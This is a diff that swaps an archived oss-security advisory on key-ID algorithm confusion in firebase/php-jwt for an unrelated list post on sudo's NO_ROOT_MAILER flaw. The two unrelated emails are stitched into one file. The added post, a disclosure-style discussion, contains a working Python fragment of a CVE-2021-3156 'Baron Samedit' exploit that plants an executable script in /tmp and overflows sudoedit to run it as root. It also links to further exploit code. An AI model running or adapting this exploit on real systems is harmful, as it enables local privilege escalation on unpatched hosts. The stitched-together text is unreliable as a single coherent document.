@@ -1,119 +1,71 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/08/11/4
-Message-ID: <CAKws9z0ZM_Vj0jE8NO6jPHaqsvnUvTdEvEY9WE_-mW871u92tQ@mail.gmail.com>
-Date: Wed, 11 Aug 2021 06:36:25 -0400
-From: Paragon Initiative Enterprises Security Team <security@...agonie.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/02/15/1
+Message-ID: <2645-1613376404.018580@le5V.JgUV.WnPT>
+Date: Mon, 15 Feb 2021 08:06:44 +0000
+From: Roman Fiedler <roman.fiedler@...aralleled.eu>
 To: oss-security@...ts.openwall.com
-Cc: fulldisclosure@...lists.org
-Subject: firebase/php-jwt Algorithm Confusion with Key IDs
+Subject: Re: sudo: Ineffective NO_ROOT_MAILER and Baron Samedit
 Content-Type: text/plain; charset=utf-8
 
-__Background__
+Roman Fiedler writes:
+> Hello list,
+>
+> While reproducing the exploitation of "Baron Samedit" another
+> minor issue in Sudo was discovered. It affects Sudo 1.9.4
+> and newer and renders the "NO_ROOT_MAILER" hardening option
+> useless. While this bug by itself is not known to be exploitable
+> on its own, combining it with the "Baron Samedit" heap overflow
+> eases exploitation of the later tremendously.
+> ...
 
-Once upon a time, the Auth0 team demonstrated several attacks against JWT
-libraries that are still found to this day. You can read about their
-research here:
-https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+Now sudo patches are already deployed widely, so this is how
+the NO_ROOT_MAILER flag influenced exploit complexity:
 
-Or for a more fun spin on the issue, you can just check
-https://www.howmanydayssinceajwtalgnonevuln.com
+* With "NO_ROOT_MAILER" working using "nss_load_library" method,
+e.g. implemented by blasty: main program
+https://github.com/blasty/CVE-2021-3156/blob/main/hax.c
+(140 lines with 18 lines header) and the library to be loaded
+https://github.com/blasty/CVE-2021-3156/blob/main/lib.c
+(16 lines), total 156 lines.
 
-The two issues that were identified there were alg=none and substituting
-HMAC over an asymmetric alg header (RS256, PS256, ES256, etc.). We like to
-distinguish the two by referring to the alg=none as a Downgrade Attack, and
-the other as Algorithm Confusion (even though, strictly speaking, they're
-both examples of Algorithm Confusion).
+* Without "NO_ROOT_MAILER": love-letter-to-the-baron.py
+(43 lines with 18 lines header).
 
-Now let's talk about Firebase's PHP-JWT Library.
 
-__PHP-JWT__
+heraldName = '/tmp/XXXXXXXXXXXXXXXXXXXXXXXXX'
+heraldFd = os.open(heraldName, os.O_WRONLY|os.O_CREAT|os.O_TRUNC|os.O_NOCTTY)
+os.write(
+    heraldFd,
+    b'#!/bin/sh\ncat <<EOF > /the-letter.txt\nMy dearest Baron,...\n\nWith love,\nX*96\n\nLegal disclaimer:\n\n' + bytes(disclaimer, 'utf8') + b'\nEOF\n')
+os.fchmod(heraldFd, 0o755)
+os.close(heraldFd)
 
-To their credit, the Firebase team attempts to side-step the Algorithm
-Confusion issue:
-https://github.com/firebase/php-jwt/blob/d2113d9b2e0e349796e72d2a63cf9319100382d2/src/JWT.php#L103-L108
+devNullHandle = os.open('/dev/null', os.O_RDONLY)
+letterEnv = {
+    'LC_ALL': 'C.UTF-8',
+    'LANGUAGE': 'A'*84}
+letterArgs = [
+    '/usr/bin/sudoedit', '-S', '-s', '\\',
+    'X'*96 + heraldName]
+process = subprocess.Popen(
+    letterArgs, stdin=devNullHandle, env=letterEnv, cwd="/")
+process.wait()
 
-The above code will check the alg header of a token and make sure it's in
-the allow-list of acceptable algorithm identifiers. If the developer
-talking to this library hard-codes support for only RS256, you can't just
-swap an alg header.
 
-But then there's this:
-https://github.com/firebase/php-jwt/blob/d2113d9b2e0e349796e72d2a63cf9319100382d2/src/JWT.php#L114-L123
+Note: I know that line numbers are not a perfect measure for
+complexity, it is just a very poor approximation.
 
-If you provide a `kid` header, the key is retrieved from the associative
-array. Since keys are just strings (which means your HMAC keys can be
-extremely weak passwords), there is no mechanism to prevent a very silly
-form of misuse.
 
-Imagine you have two different endpoints. (This can also work against
-middleware, but two different endpoints is easier to visualize.)
 
-The first endpoint expects HS256 tokens, because of some JWT-based
-middleware (e.g. tamper-proof session IDs), and rejects any other algorithm.
-The second is an OAuth2/OIDC processor that expects RS256, and rejects any
-other algorithm.
+I also collected some historic information (software archeology)
+on the security-ping-pong around "NO_ROOT_MAILER" feature:
+https:///unparalleled.eu/blog/2021/20210215-a-love-letter-to-the-baron-part2/
 
-Now imagine you implement these requirements with a common PHP framework
-design: Dependency injection of a configuration object in both places
-derived from a single file.
+Kind regads,
+Roman
 
-If you have the same map of "key id" => "key material" in both endpoints,
-then attacking this is trivial: Instead of swapping the alg header, just
-swap the kid header, and now you've confused an asymmetric public key for a
-symmetric shared key. Oops!
-
-Github issue: https://github.com/firebase/php-jwt/issues/351
-Proposed patch: https://github.com/firebase/php-jwt/pull/352
-Proof of Concept (demo app with exploit code):
-https://github.com/firebase/php-jwt/files/6966712/php-jwt-poc.zip
-
-__Timeline__
-
-2021-08-03 - Issue identified in response to a Reddit question (link:
-https://www.reddit.com/r/PHP/comments/owuuem/paseto_v200_released_lengthy_release_notes/h7me0p2/
-)
-2021-08-04 - Given no security vulnerability reporting information on the
-firebase/php-jwt repository, we published it on a Github issue
-2021-08-04 - Pull request with patch sent
-2021-08-06 - Github issue bumped, still no response
-2021-08-10 - We identify and notify several of the more than 1100 open
-source PHP libraries that depend on firebase/php-jwt that may be affected
-by this issue
-2021-08-11 - Proof-of-Concept shared on the Github issue
-2021-08-11 - Immediate mitigation published at
-https://github.com/paragonie/php-jwt-guard
-2021-08-11 - Email sent to oss-security@ and fulldisclosure@
-
-__Mitigations__
-
-If you aren't using this library in the exact way that's vulnerable, it's a
-non-issue. But if you are, it could be a critical vulnerability in your
-application. Not fun.
-
-For the time being, consider only supporting one cryptography key in each
-distinct JWT::decode() code path.
-
-If you MUST use Key IDs with JWT, we wrote a library that wraps
-Firebase's library and applies the security mitigation we proposed in #352:
-https://github.com/paragonie/php-jwt-guard
-
-We will maintain our wrapper library for as long as we have to, but if the
-PHP community ends up not needing it, all the better.
-
-__Long-Term Remediation__
-
-If you don't need JWT in particular, consider PASETO for your applications
-instead:
-
-- https://github.com/paragonie/paseto
--
-https://github.com/paseto-standard/paseto-spec/blob/master/docs/02-Implementation-Guide/03-Algorithm-Lucidity.md
-
-If you need JWT because of compatibility with a third party, look into
-https://github.com/lcobucci/jwt instead of firebase/php-jwt.
-
-That's all from us right now.
-
-Security Team
-Paragon Initiative Enterprises <https://paragonie.com/security>
+| |  DI Roman Fiedler
+| /  roman.fiedler at unparalleled.eu  +43 677 63 29 28 29
+/ |  Unparalleled IT Services e.U.     FN: 516074h           VAT: ATU75050524
+| |  https://unparalleled.eu/          Felix-Dahn-Platz 4, 8010 Graz, Austria
 
